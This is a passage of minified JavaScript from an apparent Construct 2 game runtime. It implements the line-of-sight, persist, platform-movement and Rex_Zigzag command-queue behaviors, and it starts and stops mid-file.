cr.clearArray(c),!1}return cr.clearArray(c),!0};var f=new cr.ObjectSet,m=new cr.ObjectSet;function s(){}function n(){}i.prototype.HasLOSToObject=function(t){if(!t)return!1;var e,i,s,n,r,o,a=this.runtime.getCurrentConditionObjectType().getCurrentSol(),h=t.getCurrentSol(),c=a.getObjects(),l=h.getObjects();a.select_all&&cr.clearArray(a.else_instances),h.select_all&&cr.clearArray(h.else_instances);for(var u=this.runtime.getCurrentCondition().inverted,p=0,d=c.length;p<d;++p){for(s=c[p],o=!1,n=this.findLosBehavior(s),e=0,i=l.length;e<i;++e)s!==(r=l[e])&&cr.xor(n.hasLOSto(r.x,r.y),u)&&(o=!0,m.add(r));o&&f.add(s)}var g=f.valuesRef(),t=m.valuesRef();return a.select_all=!1,h.select_all=!1,cr.shallowAssignArray(a.instances,g),cr.shallowAssignArray(h.instances,t),f.clear(),m.clear(),a.hasObjects()},i.prototype.HasLOSToPosition=function(t,e){return this.hasLOSto(t,e)},t.cnds=new i,s.prototype.SetRange=function(t){this.range=t},s.prototype.SetCone=function(t){this.cone=cr.to_radians(t)},s.prototype.AddObstacle=function(t){var e=this.type.obstacleTypes;if(-1===e.indexOf(t)){for(var i,s=0,n=e.length;s<n;s++)if((i=e[s]).is_family&&-1!==i.members.indexOf(t))return;e.push(t)}},s.prototype.ClearObstacles=function(){cr.clearArray(this.type.obstacleTypes)},t.acts=new s,n.prototype.Range=function(t){t.set_float(this.range)},n.prototype.ConeOfView=function(t){t.set_float(cr.to_degrees(this.cone))},t.exps=new n}(),cr.behaviors.Persist=function(t){this.runtime=t},function(){var t=cr.behaviors.Persist.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;e.onCreate=function(){this.myProperty=this.properties[0]},e.onDestroy=function(){},e.tick=function(){this.runtime.getDt(this.inst)},t.cnds=new function(){},t.acts=new function(){},t.exps=new function(){}}(),cr.behaviors.Platform=function(t){this.runtime=t},function(){var t=cr.behaviors.Platform.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,this.leftkey=!1,this.rightkey=!1,this.jumpkey=!1,this.jumped=!1,this.doubleJumped=!1,this.canDoubleJump=!1,this.ignoreInput=!1,this.simleft=!1,this.simright=!1,this.simjump=!1,this.lastFloorObject=null,this.loadFloorObject=-1,this.lastFloorX=0,this.lastFloorY=0,this.floorIsJumpthru=!1,this.animMode=0,this.fallthrough=0,this.firstTick=!0,this.dx=0,this.dy=0};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.updateGravity=function(){this.downx=Math.cos(this.ga),this.downy=Math.sin(this.ga),this.rightx=Math.cos(this.ga-Math.PI/2),this.righty=Math.sin(this.ga-Math.PI/2),this.downx=cr.round6dp(this.downx),this.downy=cr.round6dp(this.downy),this.rightx=cr.round6dp(this.rightx),this.righty=cr.round6dp(this.righty),this.g1=this.g,this.g<0&&(this.downx*=-1,this.downy*=-1,this.g=Math.abs(this.g))},e.onCreate=function(){this.maxspeed=this.properties[0],this.acc=this.properties[1],this.dec=this.properties[2],this.jumpStrength=this.properties[3],this.g=this.properties[4],this.g1=this.g,this.maxFall=this.properties[5],this.enableDoubleJump=0!==this.properties[6],this.jumpSustain=this.properties[7]/1e3,this.defaultControls=1===this.properties[8],this.enabled=0!==this.properties[9],this.wasOnFloor=!1,this.wasOverJumpthru=this.runtime.testOverlapJumpThru(this.inst),this.loadOverJumpthru=-1,this.sustainTime=0,this.ga=cr.to_radians(90),this.updateGravity();var e=this;this.defaultControls&&!this.runtime.isDomFree&&(jQuery(document).keydown(function(t){e.onKeyDown(t)}),jQuery(document).keyup(function(t){e.onKeyUp(t)})),this.recycled||(this.myDestroyCallback=function(t){e.onInstanceDestroyed(t)}),this.runtime.addDestroyCallback(this.myDestroyCallback),this.inst.extra.isPlatformBehavior=!0},e.saveToJSON=function(){return{ii:this.ignoreInput,lfx:this.lastFloorX,lfy:this.lastFloorY,lfo:this.lastFloorObject?this.lastFloorObject.uid:-1,am:this.animMode,en:this.enabled,fall:this.fallthrough,ft:this.firstTick,dx:this.dx,dy:this.dy,ms:this.maxspeed,acc:this.acc,dec:this.dec,js:this.jumpStrength,g:this.g,g1:this.g1,mf:this.maxFall,wof:this.wasOnFloor,woj:this.wasOverJumpthru?this.wasOverJumpthru.uid:-1,ga:this.ga,edj:this.enableDoubleJump,cdj:this.canDoubleJump,dj:this.doubleJumped,sus:this.jumpSustain}},e.loadFromJSON=function(t){this.ignoreInput=t.ii,this.lastFloorX=t.lfx,this.lastFloorY=t.lfy,this.loadFloorObject=t.lfo,this.animMode=t.am,this.enabled=t.en,this.fallthrough=t.fall,this.firstTick=t.ft,this.dx=t.dx,this.dy=t.dy,this.maxspeed=t.ms,this.acc=t.acc,this.dec=t.dec,this.jumpStrength=t.js,this.g=t.g,this.g1=t.g1,this.maxFall=t.mf,this.wasOnFloor=t.wof,this.loadOverJumpthru=t.woj,this.ga=t.ga,this.enableDoubleJump=t.edj,this.canDoubleJump=t.cdj,this.doubleJumped=t.dj,this.jumpSustain=t.sus,this.leftkey=!1,this.rightkey=!1,this.jumpkey=!1,this.jumped=!1,this.simleft=!1,this.simright=!1,this.simjump=!1,this.sustainTime=0,this.updateGravity()},e.afterLoad=function(){-1===this.loadFloorObject?this.lastFloorObject=null:this.lastFloorObject=this.runtime.getObjectByUID(this.loadFloorObject),-1===this.loadOverJumpthru?this.wasOverJumpthru=null:this.wasOverJumpthru=this.runtime.getObjectByUID(this.loadOverJumpthru)},e.onInstanceDestroyed=function(t){this.lastFloorObject==t&&(this.lastFloorObject=null)},e.onDestroy=function(){this.lastFloorObject=null,this.runtime.removeDestroyCallback(this.myDestroyCallback)},e.onKeyDown=function(t){switch(t.which){case 38:t.preventDefault(),this.jumpkey=!0;break;case 37:t.preventDefault(),this.leftkey=!0;break;case 39:t.preventDefault(),this.rightkey=!0}},e.onKeyUp=function(t){switch(t.which){case 38:t.preventDefault(),this.jumpkey=!1,this.jumped=!1;break;case 37:t.preventDefault(),this.leftkey=!1;break;case 39:t.preventDefault(),this.rightkey=!1}},e.onWindowBlur=function(){this.leftkey=!1,this.rightkey=!1,this.jumpkey=!1},e.getGDir=function(){return this.g<0?-1:1},e.isOnFloor=function(){var t,e,i,s,n=null,r=this.inst.x,o=this.inst.y;if(this.inst.x+=this.downx,this.inst.y+=this.downy,this.inst.set_bbox_changed(),this.lastFloorObject&&this.runtime.testOverlap(this.inst,this.lastFloorObject)&&(!this.runtime.typeHasBehavior(this.lastFloorObject.type,cr.behaviors.solid)||this.lastFloorObject.extra.solidEnabled))return this.inst.x=r,this.inst.y=o,this.inst.set_bbox_changed(),this.lastFloorObject;if((t=this.runtime.testOverlapSolid(this.inst))||0!==this.fallthrough||(n=this.runtime.testOverlapJumpThru(this.inst,!0)),this.inst.x=r,this.inst.y=o,this.inst.set_bbox_changed(),t)return this.runtime.testOverlap(this.inst,t)?null:(this.floorIsJumpthru=!1,t);if(n&&n.length){for(s=e=0,i=n.length;e<i;e++)n[s]=n[e],this.runtime.testOverlap(this.inst,n[e])||s++;if(1<=s)return this.floorIsJumpthru=!0,n[0]}return null},e.tick=function(){},e.posttick=function(){var t,e,i,s,n,r,o,a,h=this.runtime.getDt(this.inst);this.jumpkey||this.simjump||(this.jumped=!1);var c=this.leftkey||this.simleft,l=this.rightkey||this.simright,u=this.jumpkey||this.simjump,p=u&&!this.jumped;if(this.simleft=!1,this.simright=!1,this.simjump=!1,this.enabled){this.ignoreInput&&(p=u=l=c=!1),u||(this.sustainTime=0);var d=this.lastFloorObject,g=!1;this.firstTick&&((this.runtime.testOverlapSolid(this.inst)||this.runtime.testOverlapJumpThru(this.inst))&&this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy,4,!0),this.firstTick=!1),!d||0!==this.dy||d.y===this.lastFloorY&&d.x===this.lastFloorX||(t=d.x-this.lastFloorX,e=d.y-this.lastFloorY,this.inst.x+=t,this.inst.y+=e,this.inst.set_bbox_changed(),this.lastFloorX=d.x,this.lastFloorY=d.y,g=!0,this.runtime.testOverlapSolid(this.inst)&&this.runtime.pushOutSolid(this.inst,-t,-e,2.5*Math.sqrt(t*t+e*e)));var f=this.isOnFloor(),m=this.runtime.testOverlapSolid(this.inst);if(m){var y=Math.abs(this.inst.width),_=Math.abs(this.inst.height);if(this.inst.extra.inputPredicted)this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy,10,!1);else if(this.runtime.pushOutSolidAxis(this.inst,-this.downx,-this.downy,_/8))this.runtime.registerCollision(this.inst,m);else if(this.runtime.pushOutSolidAxis(this.inst,this.rightx,this.righty,y/2))this.runtime.registerCollision(this.inst,m);else if(this.runtime.pushOutSolidAxis(this.inst,this.downx,this.downy,_/2))this.runtime.registerCollision(this.inst,m);else{if(!this.runtime.pushOutSolidNearest(this.inst,Math.max(y,_)/2))return;this.runtime.registerCollision(this.inst,m)}}f?(this.doubleJumped=!1,this.canDoubleJump=!1,0<this.dy&&(this.wasOnFloor||(this.runtime.pushInFractional(this.inst,-this.downx,-this.downy,f,16),this.wasOnFloor=!0),this.dy=0),d!=f?(this.lastFloorObject=f,this.lastFloorX=f.x,this.lastFloorY=f.y,this.runtime.registerCollision(this.inst,f)):g&&(m=this.runtime.testOverlapSolid(this.inst))&&(this.runtime.registerCollision(this.inst,m),0!==t&&(0<t?this.runtime.pushOutSolid(this.inst,-this.rightx,-this.righty):this.runtime.pushOutSolid(this.inst,this.rightx,this.righty)),this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy))):u||(this.canDoubleJump=!0),(f&&p||!f&&this.enableDoubleJump&&u&&this.canDoubleJump&&!this.doubleJumped)&&(o=this.inst.x,a=this.inst.y,this.inst.x-=this.downx,this.inst.y-=this.downy,this.inst.set_bbox_changed(),this.runtime.testOverlapSolid(this.inst)?p=!1:(this.sustainTime=this.jumpSustain,this.runtime.trigger(cr.behaviors.Platform.prototype.cnds.OnJump,this.inst),this.animMode=2,this.dy=-this.jumpStrength,p=!0,f?this.jumped=!0:this.doubleJumped=!0),this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed()),f||(u&&0<this.sustainTime?(this.dy=-this.jumpStrength,this.sustainTime-=h):(this.lastFloorObject=null,this.dy+=this.g*h,this.dy>this.maxFall&&(this.dy=this.maxFall)),p&&(this.jumped=!0)),this.wasOnFloor=!!f,c==l&&(this.dx<0?(this.dx+=this.dec*h,0<this.dx&&(this.dx=0)):0<this.dx&&(this.dx-=this.dec*h,this.dx<0&&(this.dx=0))),c&&!l&&(0<this.dx?this.dx-=(this.acc+this.dec)*h:this.dx-=this.acc*h),l&&!c&&(this.dx<0?this.dx+=(this.acc+this.dec)*h:this.dx+=this.acc*h),this.dx>this.maxspeed?this.dx=this.maxspeed:this.dx<-this.maxspeed&&(this.dx=-this.maxspeed);u=!1;if(0!==this.dx&&(o=this.inst.x,a=this.inst.y,t=this.dx*h*this.rightx,e=this.dx*h*this.righty,this.inst.x+=this.rightx*(1<this.dx?1:-1)-this.downx,this.inst.y+=this.righty*(1<this.dx?1:-1)-this.downy,this.inst.set_bbox_changed(),l=!1,v=this.runtime.testOverlapSolid(this.inst),this.inst.x=o+t,this.inst.y=a+e,this.inst.set_bbox_changed(),!(c=this.runtime.testOverlapSolid(this.inst))&&f&&(c=this.runtime.testOverlapJumpThru(this.inst))&&(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed(),l=!this.runtime.testOverlap(this.inst,c)||(c=null,!1),this.inst.x=o+t,this.inst.y=a+e,this.inst.set_bbox_changed()),c?(w=Math.abs(this.dx*h)+2,v||!this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy,w,l,c)?(this.runtime.registerCollision(this.inst,c),w=Math.max(Math.abs(this.dx*h*2.5),30),this.runtime.pushOutSolid(this.inst,this.rightx*(this.dx<0?1:-1),this.righty*(this.dx<0?1:-1),w,!1)?!f||l||this.floorIsJumpthru||(o=this.inst.x,a=this.inst.y,this.inst.x+=this.downx,this.inst.y+=this.downy,this.runtime.testOverlapSolid(this.inst)&&this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy,3,!1)||(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed())):(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed()),l||(this.dx=0)):!v&&!p&&Math.abs(this.dy)<Math.abs(this.jumpStrength/4)&&(this.dy=0,f||(u=!0))):(x=this.isOnFloor(),f&&!x?(b=Math.ceil(Math.abs(this.dx*h))+2,o=this.inst.x,a=this.inst.y,this.inst.x+=this.downx*b,this.inst.y+=this.downy*b,this.inst.set_bbox_changed(),this.runtime.testOverlapSolid(this.inst)||this.runtime.testOverlapJumpThru(this.inst)?this.runtime.pushOutSolid(this.inst,-this.downx,-this.downy,b+2,!0):(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed())):x&&(!f&&this.floorIsJumpthru&&(this.lastFloorObject=x,this.lastFloorX=x.x,this.lastFloorY=x.y,u=!(this.dy=0)),0===this.dy&&this.runtime.pushInFractional(this.inst,-this.downx,-this.downy,x,16)))),0!==this.dy){o=this.inst.x,a=this.inst.y,this.inst.x+=this.dy*h*this.downx,this.inst.y+=this.dy*h*this.downy;var v=this.inst.x,b=this.inst.y;this.inst.set_bbox_changed();var w,x=!1;if(!(m=this.runtime.testOverlapSolid(this.inst))&&0<this.dy&&!f){if((i=0<this.fallthrough?null:this.runtime.testOverlapJumpThru(this.inst,!0))&&i.length){if(this.wasOverJumpthru){for(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed(),r=s=0,n=i.length;s<n;s++)i[r]=i[s],this.runtime.testOverlap(this.inst,i[s])||r++;i.length=r,this.inst.x=v,this.inst.y=b,this.inst.set_bbox_changed()}1<=i.length&&(m=i[0])}x=!!m}m&&(this.runtime.registerCollision(this.inst,m),this.sustainTime=0,w=x?Math.abs(this.dy*h*2.5+10):Math.max(Math.abs(this.dy*h*2.5+10),30),this.runtime.pushOutSolid(this.inst,this.downx*(this.dy<0?1:-1),this.downy*(this.dy<0?1:-1),w,x,m)?(this.lastFloorObject=m,this.lastFloorX=m.x,this.lastFloorY=m.y,(this.floorIsJumpthru=x)&&(u=!0),this.dy=0):(this.inst.x=o,this.inst.y=a,this.inst.set_bbox_changed(),this.wasOnFloor=!0,x||(this.dy=0)))}3!==this.animMode&&0<this.dy&&!f&&(this.runtime.trigger(cr.behaviors.Platform.prototype.cnds.OnFall,this.inst),this.animMode=3),(f||u)&&0<=this.dy&&(3===this.animMode||u||p&&0===this.dy?(this.runtime.trigger(cr.behaviors.Platform.prototype.cnds.OnLand,this.inst),0===this.dx&&0===this.dy?this.animMode=0:this.animMode=1):(0!==this.animMode&&0===this.dx&&0===this.dy&&(this.runtime.trigger(cr.behaviors.Platform.prototype.cnds.OnStop,this.inst),this.animMode=0),1===this.animMode||0===this.dx&&0===this.dy||p||(this.runtime.trigger(cr.behaviors.Platform.prototype.cnds.OnMove,this.inst),this.animMode=1))),0<this.fallthrough&&this.fallthrough--,this.wasOverJumpthru=this.runtime.testOverlapJumpThru(this.inst)}},i.prototype.IsMoving=function(){return 0!==this.dx||0!==this.dy},i.prototype.CompareSpeed=function(t,e){var i=Math.sqrt(this.dx*this.dx+this.dy*this.dy);return cr.do_cmp(i,t,e)},i.prototype.IsOnFloor=function(){if(0!==this.dy)return!1;var t,e,i,s,n=null,r=this.inst.x,o=this.inst.y;if(this.inst.x+=this.downx,this.inst.y+=this.downy,this.inst.set_bbox_changed(),(t=this.runtime.testOverlapSolid(this.inst))||0!==this.fallthrough||(n=this.runtime.testOverlapJumpThru(this.inst,!0)),this.inst.x=r,this.inst.y=o,this.inst.set_bbox_changed(),t)return!this.runtime.testOverlap(this.inst,t);if(n&&n.length){for(s=e=0,i=n.length;e<i;e++)n[s]=n[e],this.runtime.testOverlap(this.inst,n[e])||s++;if(1<=s)return!0}return!1},i.prototype.IsByWall=function(t){var e,i=this.inst.x,s=this.inst.y;return 0===t?(this.inst.x-=2*this.rightx,this.inst.y-=2*this.righty):(this.inst.x+=2*this.rightx,this.inst.y+=2*this.righty),this.inst.set_bbox_changed(),this.runtime.testOverlapSolid(this.inst)?(this.inst.x-=3*this.downx,this.inst.y-=3*this.downy,this.inst.set_bbox_changed(),e=this.runtime.testOverlapSolid(this.inst),this.inst.x=i,this.inst.y=s,this.inst.set_bbox_changed(),e):(this.inst.x=i,this.inst.y=s,this.inst.set_bbox_changed(),!1)},i.prototype.IsJumping=function(){return this.dy<0},i.prototype.IsFalling=function(){return 0<this.dy},i.prototype.OnJump=function(){return!0},i.prototype.OnFall=function(){return!0},i.prototype.OnStop=function(){return!0},i.prototype.OnMove=function(){return!0},i.prototype.OnLand=function(){return!0},i.prototype.IsDoubleJumpEnabled=function(){return this.enableDoubleJump},t.cnds=new i,s.prototype.SetIgnoreInput=function(t){this.ignoreInput=t},s.prototype.SetMaxSpeed=function(t){this.maxspeed=t,this.maxspeed<0&&(this.maxspeed=0)},s.prototype.SetAcceleration=function(t){this.acc=t,this.acc<0&&(this.acc=0)},s.prototype.SetDeceleration=function(t){this.dec=t,this.dec<0&&(this.dec=0)},s.prototype.SetJumpStrength=function(t){this.jumpStrength=t,this.jumpStrength<0&&(this.jumpStrength=0)},s.prototype.SetGravity=function(t){this.g1!==t&&(this.g=t,this.updateGravity(),this.runtime.testOverlapSolid(this.inst)&&(this.runtime.pushOutSolid(this.inst,this.downx,this.downy,10),this.inst.x+=2*this.downx,this.inst.y+=2*this.downy,this.inst.set_bbox_changed()),this.lastFloorObject=null)},s.prototype.SetMaxFallSpeed=function(t){this.maxFall=t,this.maxFall<0&&(this.maxFall=0)},s.prototype.SimulateControl=function(t){switch(t){case 0:this.simleft=!0;break;case 1:this.simright=!0;break;case 2:this.simjump=!0}},s.prototype.SetVectorX=function(t){this.dx=t},s.prototype.SetVectorY=function(t){this.dy=t},s.prototype.SetGravityAngle=function(t){t=cr.to_radians(t),t=cr.clamp_angle(t),this.ga!==t&&(this.ga=t,this.updateGravity(),this.lastFloorObject=null)},s.prototype.SetEnabled=function(t){this.enabled!==(1===t)&&(this.enabled=1===t,this.enabled||(this.lastFloorObject=null))},s.prototype.FallThrough=function(){var t=this.inst.x,e=this.inst.y;this.inst.x+=this.downx,this.inst.y+=this.downy,this.inst.set_bbox_changed();var i=this.runtime.testOverlapJumpThru(this.inst,!1);this.inst.x=t,this.inst.y=e,this.inst.set_bbox_changed(),i&&(this.fallthrough=3,this.lastFloorObject=null)},s.prototype.SetDoubleJumpEnabled=function(t){this.enableDoubleJump=0!==t},s.prototype.SetJumpSustain=function(t){this.jumpSustain=t/1e3},t.acts=new s,n.prototype.Speed=function(t){t.set_float(Math.sqrt(this.dx*this.dx+this.dy*this.dy))},n.prototype.MaxSpeed=function(t){t.set_float(this.maxspeed)},n.prototype.Acceleration=function(t){t.set_float(this.acc)},n.prototype.Deceleration=function(t){t.set_float(this.dec)},n.prototype.JumpStrength=function(t){t.set_float(this.jumpStrength)},n.prototype.Gravity=function(t){t.set_float(this.g)},n.prototype.GravityAngle=function(t){t.set_float(cr.to_degrees(this.ga))},n.prototype.MaxFallSpeed=function(t){t.set_float(this.maxFall)},n.prototype.MovingAngle=function(t){t.set_float(cr.to_degrees(Math.atan2(this.dy,this.dx)))},n.prototype.VectorX=function(t){t.set_float(this.dx)},n.prototype.VectorY=function(t){t.set_float(this.dy)},n.prototype.JumpSustain=function(t){t.set_float(1e3*this.jumpSustain)},t.exps=new n}(),cr.behaviors.Rex_Zigzag=function(t){this.runtime=t},function(){var behaviorProto=cr.behaviors.Rex_Zigzag.prototype;behaviorProto.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime};var behtypeProto=behaviorProto.Type.prototype;behtypeProto.onCreate=function(){},behaviorProto.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var behinstProto=behaviorProto.Instance.prototype,transferCmd=function(t,e){switch(t){case"F":t="M";break;case"B":t="M",e=-e;break;case"R":t="R";break;case"L":t="R",e=-e;break;case"W":break;default:return null}return{cmd:t,param:e}},parseSpeed=function(speedString){var newSpeedValue=""!=speedString?eval("("+speedString+")"):null;return newSpeedValue},parsingRresult=[null,null],parseCmd1=function(t){var e,i=t.indexOf("["),t=-1!=i?(e=t.slice(i),t.slice(0,i)):(e="",t);return parsingRresult[0]=t,parsingRresult[1]=e,parsingRresult},parseCmdString=function(t){for(var e,i,s,n=[],r=t.split(/;|\n/),o=r.length,a=0;a<o;a++)2==(i=(s=parseCmd1(r[a]))[0].replace(/(^\s*)|(\s*$)/g,"").replace(/(\s+)/g," ").split(" ")).length&&(e=i[0].toUpperCase(),i=parseFloat(i[1]),(i=transferCmd(e,i))&&(i.speed=parseSpeed(s[1]),n.push(i)));return n};function Cnds(){}behinstProto.onCreate=function(){this.activated=this.properties[0],this.isRun=1==this.properties[1];var t=1==this.properties[2],e=1==this.properties[12],i=1==this.properties[13],s=1==this.properties[14];this.currentCmd=null,this.inst.xOffset=0,this.inst.yOffset=0,this.isMyCall=!1;var n=t?this.inst.angle:cr.to_clamped_radians(this.properties[11]);this.inst.angleOffset=n,this.recycled||(this.positionData={x:0,y:0,a:0}),this.positionData.x=s?0:this.inst.x,this.positionData.y=s?0:this.inst.y,this.positionData.a=n,this.recycled?this.CmdQueue.Init(this.properties[3]):this.CmdQueue=new CmdQueue(this.properties[3]),this.recycled?this.CmdMove.Init(this.inst,this.properties[5],this.properties[6],this.properties[7],e,i,s):this.CmdMove=new CmdMoveKlass(this.inst,this.properties[5],this.properties[6],this.properties[7],e,i,s),this.recycled?this.CmdRotate.Init(this.inst,t,this.properties[8],this.properties[9],this.properties[10],e,i,s):this.CmdRotate=new CmdRotateKlass(this.inst,t,this.properties[8],this.properties[9],this.properties[10],e,i,s),this.recycled?this.CmdWait.Init(i):this.CmdWait=new CmdWaitKlass(i),this.recycled||(this.cmdMap={M:this.CmdMove,R:this.CmdRotate,W:this.CmdWait}),this.AddCommandString(this.properties[4])},behinstProto.tick=function(){if(0!=this.activated&&this.isRun)for(var t,e=this.runtime.getDt(this.inst);e;){if(null==this.currentCmd){if(this.currentCmd=this.CmdQueue.GetCmd(),null==this.currentCmd){this.isRun=!1,this.isMyCall=!0,this.runtime.trigger(cr.behaviors.Rex_Zigzag.prototype.cnds.OnCmdQueueFinish,this.inst),this.isMyCall=!1;break}(t=this.cmdMap[this.currentCmd.cmd]).CmdInit(this.positionData,this.currentCmd.param,this.currentCmd.speed),this.isMyCall=!0,this.runtime.trigger(cr.behaviors.Rex_Zigzag.prototype.cnds.OnCmdStart,this.inst),this.isMyCall=!1}else t=this.cmdMap[this.currentCmd.cmd];e=t.Tick(e),t.isDone&&(this.isMyCall=!0,this.runtime.trigger(cr.behaviors.Rex_Zigzag.prototype.cnds.OnCmdFinish,this.inst),this.isMyCall=!1,this.currentCmd=null)}},behinstProto.AddCommand=function(t,e){this.CmdQueue.Push(transferCmd(t,e))},behinstProto.AddCommandString=function(t){""!=t&&this.CmdQueue.PushList(parseCmdString(t))},behinstProto.saveToJSON=function(){return{en:this.activated,ir:this.isRun,ps:this.positionData,cq:this.CmdQueue.saveToJSON(),cc:this.currentCmd,cm:this.CmdMove.saveToJSON(),cr:this.CmdRotate.saveToJSON(),cw:this.CmdWait.saveToJSON()}},behinstProto.loadFromJSON=function(t){this.activated=t.en,this.isRun=t.ir,this.positionData=t.ps,this.CmdQueue.loadFromJSON(t.cq),this.currentCmd=t.cc,this.CmdMove.loadFromJSON(t.cm),this.CmdRotate.loadFromJSON(t.cr),this.CmdWait.loadFromJSON(t.cw),null!=this.currentCmd&&(this.cmdMap[this.currentCmd.cmd].target=this.positionData)},behaviorProto.cnds=new Cnds,Cnds.prototype.CompareMovSpeed=function(t,e){return cr.do_cmp(this.CmdMove.currentSpeed,t,e)},Cnds.prototype.CompareRotSpeed=function(t,e){return cr.do_cmp(this.CmdRotate.currentSpeed,t,e)};var isValidCmd=function(t,e){if(null==t)return!1;var i;switch(e){case 0:i="M"==t.cmd&&0<=t.param;break;case 1:i="M"==t.cmd&&t.param<0;break;case 2:i="R"==t.cmd&&0<=t.param;break;case 3:i="R"==t.cmd&&t.param<0;break;case 4:i="W"==t.cmd;break;default:i=!0}return i};function Acts(){}Cnds.prototype.IsCmd=function(t){return isValidCmd(this.currentCmd,t)},Cnds.prototype.OnCmdQueueFinish=function(){return this.isMyCall},Cnds.prototype.OnCmdStart=function(t){return isValidCmd(this.currentCmd,t)&&this.isMyCall},Cnds.prototype.OnCmdFinish=function(t){return isValidCmd(this.currentCmd,t)&&this.isMyCall},behaviorProto.acts=new Acts,Acts.prototype.SetActivated=function(t){this.activated=t},Acts.prototype.Start=function(){this.currentCmd=null,this.isRun=!0,this.CmdQueue.Reset(),this.positionData.x=this.CmdMove.absoluteMode?0:this.inst.x,this.positionData.y=this.CmdMove.absoluteMode?0:this.inst.y,this.CmdRotate.rotatable&&(this.positionData.a=this.inst.angle)},Acts.prototype.Stop=function(){this.currentCmd=null,this.isRun=!1},Acts.prototype.SetMaxMovSpeed=function(t){this.CmdMove.move.max=t},Acts.prototype.SetMovAcceleration=function(t){this.CmdMove.move.acc=t},Acts.prototype.SetMovDeceleration=function(t){this.CmdMove.move.dec=t},Acts.prototype.SetMaxRotSpeed=function(t){this.CmdRotate.move.max=t},Acts.prototype.SetRotAcceleration=function(t){this.CmdRotate.move.acc=t},Acts.prototype.SetRotDeceleration=function(t){this.CmdRotate.move.dec=t},Acts.prototype.SetRepeatCount=function(t){this.CmdQueue.repeatCount=t,this.CmdQueue.repeatCountSave=t},Acts.prototype.CleanCmdQueue=function(){this.CmdQueue.CleanAll()};var index2NameMap=["F","B","R","L","W"];function Exps(){}Acts.prototype.AddCmd=function(t,e){this.AddCommand(index2NameMap[t],e)},Acts.prototype.AddCmdString=function(t){this.AddCommandString(t)},Acts.prototype.SetRotatable=function(t){this.CmdRotate.rotatable=1==t},Acts.prototype.SetMovingAngle=function(t){t=cr.to_clamped_radians(t);this.CmdMove.absoluteMode?this.inst.angleOffset=t:(this.positionData.a=t,this.CmdRotate.rotatable&&(this.inst.angle=t,this.inst.set_bbox_changed()))},Acts.prototype.SetPrecise=function(t){t=1==t;this.CmdMove.preciseMode=t,this.CmdRotate.preciseMode=t},Acts.prototype.SetAbsolute=function(t){t=1==t;this.CmdMove.absoluteMode=t,this.CmdRotate.absoluteMode=t},behaviorProto.exps=new Exps,Exps.prototype.Activated=function(t){t.set_int(this.activated)},Exps.prototype.MovSpeed=function(t){t.set_float(this.CmdMove.currentSpeed)},Exps.prototype.MaxMovSpeed=function(t){t.set_float(this.CmdMove.move.max)},Exps.prototype.MovAcc=function(t){t.set_float(this.CmdMove.move.acc)},Exps.prototype.MovDec=function(t){t.set_float(this.CmdMove.move.dec)},Exps.prototype.RotSpeed=function(t){t.set_float(this.CmdRotate.currentSpeed)},Exps.prototype.MaxRotSpeed=function(t){t.set_float(this.CmdRotate.move.max)},Exps.prototype.RotAcc=function(t){t.set_float(this.CmdRotate.move.acc)},Exps.prototype.RotDec=function(t){t.set_float(this.CmdRotate.move.dec)},Exps.prototype.Rotatable=function(t){t.set_int(this.CmdRotate.rotatable)},Exps.prototype.RepCnt=function(t){t.set_int(this.CmdQueue.repeatCountSave)},Exps.prototype.CmdIndex=function(t){t.set_int(this.CmdQueue.currentCmdQueueIndex)},Exps.prototype.MovAngle=function(t){var e;isValidCmd(this.currentCmd,2)||isValidCmd(this.currentCmd,3)?(e=this.CmdRotate.currentAngleDeg)<0&&(e=360+e):e=cr.to_clamped_degrees(this.positionData.a),t.set_float(e)},Exps.prototype.OffAngle=function(t){var e=this.CmdRotate.rotatable?cr.to_clamped_degrees(this.inst.angleOffset):0;"number"==typeof e?t.set_float(e):t.set_float(0)},Exps.prototype.OffX=function(t){var e=this.inst.xOffset;"number"==typeof e?t.set_float(e):t.set_float(0)},Exps.prototype.OffY=function(t){var e=this.inst.yOffset;"number"==typeof e?t.set_float(e):t.set_float(0)};var CmdQueue=function(t){this.Init(t)},CmdQueueProto=CmdQueue.prototype;CmdQueueProto.Init=function(t){this.CleanAll(),this.repeatCount=t,this.repeatCountSave=t},CmdQueueProto.CleanAll=function(){this.queueIndex=0,this.currentCmdQueueIndex=-1,this.queue=[]},CmdQueueProto.Reset=function(){this.repeatCount=this.repeatCountSave,this.queueIndex=0,this.currentCmdQueueIndex=-1},CmdQueueProto.Push=function(t){this.queue.push(t)},CmdQueueProto.PushList=function(t){this.queue.push.apply(this.queue,t)},CmdQueueProto.GetCmd=function(){var t=this.queue[this.queueIndex];this.currentCmdQueueIndex=this.queueIndex;var e=this.queueIndex+1;return e>=this.queue.length?1!=this.repeatCount?(this.queueIndex=0,--this.repeatCount):this.queueIndex=-1:this.queueIndex=e,t},CmdQueueProto.saveToJSON=function(){return{i:this.queueIndex,cci:this.currentCmdQueueIndex,q:this.queue,rptsv:this.repeatCountSave,rpt:this.repeatCount}},CmdQueueProto.loadFromJSON=function(t){this.queueIndex=t.i,this.currentCmdQueueIndex=t.cci,this.queue=t.q,this.repeatCountSave=t.rptsv,this.repeatCount=t.rpt};var 